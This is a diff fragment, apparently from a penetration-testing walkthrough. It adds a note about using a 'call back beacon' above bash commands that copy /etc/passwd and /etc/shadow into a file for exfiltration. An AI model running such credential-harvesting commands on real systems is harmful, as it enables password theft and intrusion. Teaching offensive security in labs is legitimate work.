@@ -271,6 +271,8 @@ Now that we have a way to return to the system, let’s gather critical files co
 
 1. We’ll start by viewing some important files and saving them to a new document for exfiltration:
 
+`UTILIZING THE CALL BACK BEACON- NOT THE EXPLOIT SHELL`
+
 ```bash
 cat /etc/passwd > users.txt
 cat /etc/shadow >> users.txt  # Notice the '>>', it appends the content of /etc/shadow
